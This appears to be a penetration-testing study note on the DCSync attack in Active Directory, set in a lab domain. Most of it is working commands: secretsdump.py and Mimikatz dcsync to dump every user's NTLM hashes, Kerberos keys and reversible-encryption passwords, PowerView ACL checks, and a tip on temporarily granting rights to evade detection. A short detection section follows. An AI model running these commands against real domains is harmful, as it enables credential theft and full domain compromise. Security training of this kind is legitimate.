# DCSync Attack — Active Directory

## What is DCSync?
DCSync mimics a Domain Controller requesting password replication using the **Directory Replication Service Remote Protocol (MS-DRSR)**. It allows an attacker to retrieve NTLM password hashes (current and historical) for any domain user without ever touching the NTDS.dit file directly on the DC.

**Required permissions on the domain object:**
- `Replicating Directory Changes`
- `Replicating Directory Changes All`

Domain/Enterprise Admins have these by default. Non-admin accounts can also be granted these rights — check for this during enumeration.

---

## Verifying DCSync Rights

### Check the target account's SID
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

### Confirm replication ACEs on the domain object
```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```
Look for: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` with `AccessAllowed`.

---

## Method 1 — secretsdump.py (Linux / Remote)

Must be run as (or using credentials of) a user with DCSync rights.

### Dump everything to files (NTLM, Kerberos, cleartext)
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

**Output files:**
```
inlanefreight_hashes.ntds          # NTLM hashes
inlanefreight_hashes.ntds.kerberos # Kerberos keys
inlanefreight_hashes.ntds.cleartext # Cleartext passwords (reversible encryption accounts only)
```

### Useful flags
| Flag | Purpose |
|---|---|
| `-just-dc` | NTLM hashes + Kerberos keys |
| `-just-dc-ntlm` | NTLM hashes only |
| `-just-dc-user <USER>` | Single user only |
| `-pwd-last-set` | Include password last set timestamp |
| `-history` | Include password history |
| `-user-status` | Include enabled/disabled status (useful for reporting — filter out disabled accounts before presenting stats to client) |

---

## Method 2 — Mimikatz (Windows)

Must be run **in the context of the user with DCSync rights**. Use `runas` to spawn a shell as that user if needed.

### Spawn PowerShell as adunn
```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Perform DCSync with Mimikatz
```
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
Returns the NTLM hash (and supplemental credentials) for the specified user.

---

## Reversible Encryption — Cleartext Passwords

Some accounts have the **"Store password using reversible encryption"** flag set (userAccountControl value 128). Passwords are stored RC4-encrypted with the Syskey, which secretsdump.py automatically decrypts — outputting cleartext passwords in the `.ntds.cleartext` file.

### Enumerate accounts with reversible encryption (AD module)
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### Enumerate with PowerView
```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

> Accounts set this way will have their password stored in RC4 until the password is changed. Once the setting is disabled, the cleartext will persist until a password change occurs.

---

## Reporting Considerations

When presenting password cracking statistics to a client (% cracked, top passwords, length metrics, reuse), always filter out **disabled accounts** using `-user-status` flag output to ensure metrics reflect only active users.

---

## Detection

DCSync generates anomalous **DS-Replication-Get-Changes-All** requests originating from non-DC machines. Monitor for:
- Replication requests from non-DC hosts
- Unexpected accounts with replication ACEs on the domain object (Event ID 5136 on ACL changes)

If WriteDacl rights exist over the domain object, an attacker can temporarily grant DCSync rights, perform the attack, and remove them — making detection harder.

---

## Key Takeaway
DCSync = ask the DC to replicate password data to us. Requires `Replicating Directory Changes` + `Replicating Directory Changes All` on the domain object. Obtainable via legitimate DA access, ACL abuse (GenericAll/WriteDacl on domain object), or discovering a non-admin account that was incorrectly granted replication rights. Result: NTLM hashes for every domain account → full domain compromise.